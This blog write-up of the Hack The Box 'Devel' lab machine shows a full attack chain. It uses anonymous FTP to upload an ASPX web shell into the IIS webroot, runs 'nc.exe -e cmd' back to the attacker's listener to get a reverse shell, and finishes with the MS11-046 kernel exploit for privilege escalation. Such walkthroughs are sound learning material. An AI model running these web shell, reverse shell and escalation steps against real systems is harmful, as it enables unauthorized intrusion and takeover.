---
layout: post
title: HTB Machine - Devel
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1.png
share-img: https://www.hackthebox.com/storage/avatars/0fb6455a29eb4f2682f04a780ce26cb1.png
tags: [ HTB, Hack the Box,IIS,ASP,Web,Network,Protocols,FTP,Remote Code Execution,Arbitrary File Upload]
---
scans:
```zsh
nmap -sS --min-rate 5000 -n -Pn -p- -oG ./nmap/allports 10.10.10.5
nmap -sCV -oN ./nmap/targeted -p21,80 10.10.10.5
```
We have a windows machine with 2 ports open, ftp and web. We can login to the ftp with anonymous/no pass.
```zsh
ftp 10.10.10.5

dir
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```
there is no much in the ftp so we can examine the webpage. There is nothing but an image. 
```zsh
whatweb http://10.10.10.5
http://10.10.10.5 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.5], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]
```
lets download the image from the ftp. First we need to set the ftp in binary mode so it downloads the file and make sure it is not corrupted.
```zsh
ftp> binary
200 Type set to I.

ftp> get welcome.png

```
It is the same image we see in the webpage. Perhaps the ftp and the webpage are connected. To test this theory, we can upload a file and make a call inside the webpage. 
```zsh
 ftp 10.10.10.5
 put text.txt
```

if we go to http://10.10.10.5/text.txt we can see the text file being rendered; the FTP is connected to the webpage. We can upload then a malicious file that allows us to run commands in the target.
```zsh
locate cmd | grep .aspx
cp /usr/share/davtest/backdoors/aspx_cmd.aspx shell.aspx
ftp 10.10.10.5
put shell.aspx
```
we can upload a netcat to gain a bind session. after uploading it we need to know where it is, we can google IIS common path windows which is C:\inetpub\wwwroot and verify via the webpage.
```zsh
locate nc.exe
cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
ftp 10.10.10.5
put nc.exe
```
now we can launch our bind session by setting the command in the webpage not before setting our nc for incoming connections.
```zsh
sudo rlwrap nc -nlvp 443
```
C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.5 443

If we check our privileges we see the ImpersonatePrivilege and checking further the machine is a windows 7, a exploit might be available for this OS version. Lets ask google.
```cmd
whoami /all
SeImpersonatePrivilege

systeminfo
```
Google results mentions MS11-046 and we come accross an exploit for it.

[MS11-046 exploit](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe)

Upload the file to the machine and execute it to gain root access.
```zsh
ftp 10.10.10.5
binary
put ms11-046.exe
```
```cmd
cd C:\inetpub\wwwroot
.\ms11-046.exe

cd c:\users
dir /r /s user.txt
```
